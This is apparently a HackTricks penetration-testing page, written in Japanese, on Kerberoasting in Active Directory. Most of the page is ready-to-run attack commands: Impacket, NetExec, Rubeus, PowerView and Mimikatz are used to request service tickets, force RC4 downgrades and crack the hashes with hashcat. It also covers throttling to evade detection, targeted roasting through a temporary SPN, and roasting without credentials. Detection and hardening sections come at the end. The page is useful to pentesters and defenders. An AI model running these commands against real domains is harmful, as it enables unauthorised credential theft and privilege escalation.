# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting は、Active Directory（AD）内でユーザーアカウント（コンピューターアカウントを除く）の権限で実行されているサービスに関連する TGS チケットの取得に重点を置きます。これらのチケットの暗号化にはユーザーパスワードに由来するキーが使用されるため、オフラインで credential cracking を実行できます。ユーザーアカウントをサービスとして使用していることは、ServicePrincipalName（SPN）プロパティが空でないことによって示されます。

認証済みのドメインユーザーであれば誰でも TGS チケットを要求できるため、特別な権限は必要ありません。<sup>[[4]](#references)[[5]](#references)</sup>

### 主なポイント

- ユーザーアカウント（SPN が設定されたアカウント。コンピューターアカウントではない）の権限で実行されるサービスの TGS チケットを対象とする。
- チケットはサービスアカウントのパスワードから派生したキーで暗号化され、オフラインで crack できる。
- 昇格された権限は不要。認証済みアカウントであれば TGS チケットを要求できる。

> [!WARNING]
> ほとんどの公開ツールは、AES よりも crack が高速な RC4-HMAC（etype 23）サービスチケットの要求を優先します。RC4 TGS hash は `$krb5tgs$23$*`、AES128 は `$krb5tgs$17$*`、AES256 は `$krb5tgs$18$*` で始まります。ただし、多くの環境が AES-only へ移行しています。RC4 だけが関係すると考えてはいけません。
> また、「spray-and-pray」roasting は避けてください。Rubeus のデフォルトの kerberoast は、すべての SPN を query してチケットを要求できるため、noise が多くなります。まず興味深い principal を列挙して対象を絞り込んでください。

### サービスアカウントの secret と Kerberos の暗号化コスト

現在も多くのサービスが、手動で管理されたパスワードを持つユーザーアカウントの権限で実行されています。KDC はそれらのパスワードから派生したキーでサービスチケットを暗号化し、その ciphertext を認証済みの任意の principal に渡すため、kerberoasting では account lockout や DC telemetry の影響を受けず、無制限のオフライン推測が可能です。暗号化モードによって cracking budget が決まります。

| モード | キー導出 | 暗号化タイプ | RTX 5090 のおおよその throughput* | 注記 |
| --- | --- | --- | --- | --- |
| AES + PBKDF2 | PBKDF2-HMAC-SHA1、4,096 iterations、domain + SPN から生成された principal ごとの salt | etype 17/18（`$krb5tgs$17$`、`$krb5tgs$18$`） | 約 680 万 guesses/s | salt により rainbow table は阻止されますが、短いパスワードは依然として高速に crack できます。 |
| RC4 + NT hash | パスワードの MD4 を 1 回実行（salt なしの NT hash）。Kerberos はチケットごとに 8-byte の confounder を混合するだけ | etype 23（`$krb5tgs$23$`） | 約 **41.8 億** guesses/s | AES より約 1000 倍高速。攻撃者は `msDS-SupportedEncryptionTypes` が許可している場合、常に RC4 を強制します。 |

*Chick3nman による benchmark。[Matthew Green's Kerberoasting analysis](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/) に記載されています。<sup>[[3]](#references)</sup>

RC4 の confounder は keystream を randomize するだけで、guess ごとの work は増加させません。サービスアカウントが random secret（gMSA/dMSA、machine account、または vault-managed string）に依存していない限り、侵害速度は純粋に GPU budget によって決まります。AES-only etype を強制すると、1 秒あたり数十億 guesses の downgrade は排除できますが、弱い human password は依然として PBKDF2 によって crack されます。<sup>[[3]](#references)</sup>

### 攻撃

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# NetExec — LDAP enumerate + dump $krb5tgs$23/$17/$18 blobs with metadata
netexec ldap <DC_FQDN> -u <USER> -p <PASS> --kerberoast kerberoast.hashes

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
kerberoast チェックを含む多機能ツール:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Kerberoast 対象ユーザーを列挙する
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Technique 1: TGS を要求してメモリからダンプする
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- 手法 2: 自動ツール
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS request は Windows Security Event 4769（Kerberos service ticket が要求された）を生成します。

### OPSEC と AES-only 環境

- AES を使用できないアカウントに対して、意図的に RC4 を要求する:
- Rubeus: `/rc4opsec` は tgtdeleg を使用して AES を使用できないアカウントを列挙し、RC4 service ticket を要求します。
- Rubeus: kerberoast と `/tgtdeleg` を併用すると、可能な場合に RC4 request もトリガーされます。<sup>[[6]](#references)</sup>
- 失敗を通知せずに終了するのではなく、AES-only アカウントを Roast する:
- Rubeus: `/aes` は AES が有効なアカウントを列挙し、AES service ticket（etype 17/18）を要求します。
- すでに TGT（PTT または .kirbi から）を保持している場合は、`/spn:<SPN>` または `/spns:<file>` とともに `/ticket:<blob|path>` を使用して LDAP をスキップできます。
- Targeting、throttling、noise の低減:
- `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>`、`/jitter:<1-100>` を使用します。
- `/pwdsetbefore:<MM-dd-yyyy>`（古い password）で弱い password の可能性が高いアカウントを filter するか、`/ou:<DN>` で privileged OU を target にします。<sup>[[8]](#references)</sup>

Examples (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Cracking
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

アカウントを制御または変更できる場合、SPNを追加することで、そのアカウントをkerberoastableにできます:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
アカウントをダウングレードして、より容易な cracking のために RC4 を有効化する（対象オブジェクトへの書き込み権限が必要）:
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
#### Targeted Kerberoast via GenericWrite/GenericAll over a user (temporary SPN)

BloodHound でユーザーオブジェクト（例: GenericWrite/GenericAll）を制御できることが示された場合、そのユーザーに現在 SPN が設定されていなくても、対象を確実に「targeted-roast」できます:<sup>[[9]](#references)</sup>

- 制御下にあるユーザーに一時的な SPN を追加し、roast 対象にする。
- その SPN に対して RC4（etype 23）で暗号化された TGS-REP を要求し、cracking に適した状態にする。
- `$krb5tgs$23$...` hash を hashcat で crack する。
- footprint を減らすため、SPN を削除して後始末する。

Windows (PowerView/Rubeus):
```powershell
# Add temporary SPN on the target user
Set-DomainObject -Identity <targetUser> -Set @{serviceprincipalname='fake/TempSvc-<rand>'} -Verbose

# Request RC4 TGS for that user (single target)
.\Rubeus.exe kerberoast /user:<targetUser> /nowrap /rc4

# Remove SPN afterwards
Set-DomainObject -Identity <targetUser> -Clear serviceprincipalname -Verbose
```
Linux one-liner（SPNの追加 -> TGSのリクエスト（etype 23） -> SPNの削除を自動化する targetedKerberoast.py）：<sup>[[2]](#references)</sup>
```bash
targetedKerberoast.py -d '<DOMAIN>' -u <WRITER_SAM> -p '<WRITER_PASS>'
```
hashcat autodetectで出力をクラックします（`$krb5tgs$23$`にはmode 13100）：
```bash
hashcat <outfile>.hash /path/to/rockyou.txt
```
検出に関する注意: SPN の追加/削除によってディレクトリの変更が発生し、対象ユーザーでは Event ID 5136/4738 が記録されます。また、TGS リクエストによって Event ID 4769 が生成されます。throttling と prompt cleanup を検討してください。

Kerberoast 攻撃に使用できる便利なツールは、こちらにあります: https://github.com/nidem/kerberoast

Linux で次のエラーが表示された場合: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`、ローカル時刻にずれがあります。DC と時刻を同期してください:

- `ntpdate <DC_IP>` (一部のディストリビューションでは deprecated)
- `rdate -n <DC_IP>`

### ドメインアカウントなしの Kerberoast (AS-requested STs)

2022 年 9 月、Charlie Clark は、principal に pre-authentication が必要でない場合、リクエスト本文の sname を変更した crafted KRB_AS_REQ によって service ticket を取得できることを示しました。これにより、TGT の代わりに service ticket を取得できます。この手法は AS-REP roasting に類似しており、有効なドメイン資格情報を必要としません。

詳細については、Semperis の write-up「New Attack Paths: AS-requested STs」を参照してください。<sup>[[10]](#references)</sup>

> [!WARNING]
> 有効な資格情報がない場合、この手法では LDAP にクエリできないため、ユーザーのリストを提供する必要があります。

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
関連

AS-REP roastable usersを対象にしている場合は、以下も参照してください:

{{#ref}}
asreproast.md
{{#endref}}

### Detection

Kerberoastingはステルス性が高い場合があります。DCからEvent ID 4769を調査し、ノイズを減らすために以下のフィルターを適用します:

- service name `krbtgt` と、末尾が `$` の service name（computer accounts）を除外する。
- machine accountsからのリクエスト（`*$$@*`）を除外する。
- 成功したリクエストのみを対象にする（Failure Code `0x0`）。
- encryption typesを追跡する: RC4（`0x17`）、AES128（`0x11`）、AES256（`0x12`）。`0x17` のみを対象にalertしない。

PowerShell triageの例:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
追加のアイデア:

- ホスト/ユーザーごとの通常の SPN 使用状況をベースライン化し、単一の principal から異なる SPN リクエストが大量に発生した場合に alert を出す。
- AES で hardening されたドメインで、異常な RC4 使用を検出する。

### Mitigation / Hardening

- サービスには gMSA/dMSA または machine account を使用する。Managed account には 120 文字以上のランダムな password が設定され、自動的に rotation されるため、offline cracking は現実的ではない。<sup>[[7]](#references)</sup>
- `msDS-SupportedEncryptionTypes` を AES-only（decimal 24 / hex 0x18）に設定して service account に AES を強制し、その後 password を rotation して AES key を生成する。<sup>[[7]](#references)</sup>
- 可能な場合は環境内で RC4 を無効化し、RC4 使用の試行を monitor する。DC では `msDS-SupportedEncryptionTypes` が設定されていない account の default を指定するために、`DefaultDomainSupportedEncTypes` registry value を使用できる。十分に test すること。
- user account から不要な SPN を削除する。<sup>[[7]](#references)</sup>
- Managed account を使用できない場合は、長くランダムな service account password（25 文字以上）を使用し、一般的な password を禁止して定期的に audit する。<sup>[[7]](#references)</sup>

## References

- [1] [HTB: Breach – NetExec LDAP kerberoast + hashcat cracking in practice](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [ShutdownRepo/targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)
- [3] [Matthew Green – Kerberoasting: Low-Tech, High-Impact Attacks from Legacy Kerberos Crypto (2025-09-10)](https://blog.cryptographyengineering.com/2025/09/10/kerberoasting/)
- [4] [Kerberos (II): How to attack Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [5] [ired.team – Active Directory Kerberos Abuse: T1208 Kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [6] [ired.team – Kerberoasting: Requesting RC4 Encrypted TGS when AES is Enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- [7] [Microsoft Security Blog (2024-10-11) – Microsoft’s guidance to help mitigate Kerberoasting](https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/)
- [8] [SpecterOps – Rubeus kerberoast command documentation](https://docs.specterops.io/ghostpack-docs/Rubeus-mdx/commands/roasting/kerberoast)
- [9] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [10] [Semperis – New Attack Paths? AS Requested Service Tickets (Charlie Clark, Sept 2022)](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)

{{#include ../../banners/hacktricks-training.md}}
